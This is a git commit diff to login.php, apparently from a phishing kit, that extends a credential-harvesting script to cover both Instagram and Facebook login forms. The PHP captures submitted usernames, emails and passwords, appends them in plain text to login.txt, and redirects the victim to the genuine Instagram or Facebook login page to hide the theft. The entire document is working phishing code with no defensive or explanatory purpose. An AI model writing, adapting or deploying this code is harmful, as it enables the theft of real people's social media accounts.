338b6fffabcc8cf432eae2568c7fb4d9b58ff4d6
Jaat-Hacker <jaatchanderbhanchoudhary@gmail.com>
2025-04-08 12:24:56 +0530

    Update login.php

--- login.php
+++ login.php
@@ -1,10 +1,20 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $user = $_POST['username'];
-    $pass = $_POST['password'];
+    // Detect either Instagram or Facebook input names
+    $user = $_POST['username'] ?? $_POST['email'] ?? 'UNKNOWN_USER';
+    $pass = $_POST['password'] ?? $_POST['pass'] ?? 'UNKNOWN_PASS';
+
     $data = "Username: $user\nPassword: $pass\n\n";
+
     file_put_contents("login.txt", $data, FILE_APPEND);
-    header("Location: https://www.instagram.com/accounts/login/?hl=en");
+
+    // Redirect based on origin
+    if (isset($_POST['email'])) {
+        header("Location: https://m.facebook.com/login");
+    } else {
+        header("Location: https://www.instagram.com/accounts/login/?hl=en");
+    }
+
     exit();
 }
 ?>
